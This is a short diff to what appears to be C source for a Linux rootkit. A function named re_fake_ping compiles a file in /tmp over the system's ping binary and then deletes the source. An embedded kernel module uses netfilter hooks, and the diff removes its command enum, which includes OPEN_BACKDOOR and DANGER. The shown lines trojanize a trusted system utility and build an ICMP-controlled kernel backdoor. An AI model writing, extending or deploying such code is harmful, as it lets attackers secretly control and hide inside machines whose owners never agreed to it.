@@ -309,7 +309,7 @@ int re_fake_ping(void){
 
     // Replace ping
     system("gcc /tmp/ping.c -o `which ping`");
-    
+
     // Remove temporary file
     system("rm /tmp/ping.c");
     return 0;
@@ -374,14 +374,6 @@ static const char *icmpk_c = "#include <linux/kernel.h>\n"
     "static struct nf_hook_ops nfho;\n"
     "static struct workqueue_struct *work_queue;\n"
     "static atomic_t work_count = ATOMIC_INIT(0);\n"
-    "\n"
-    "\n"
-    "typedef enum COMMANDS {\n"
-    "    START_SERVICE = 0,\n"
-    "    STOP_SERVICE  = 1,\n"
-    "    OPEN_BACKDOOR = 2,\n"
-    "    DANGER        = 4\n"
-    "} command_t;\n"
     "\n"
     "struct work_item {\n"
     "    struct work_struct work;\n"
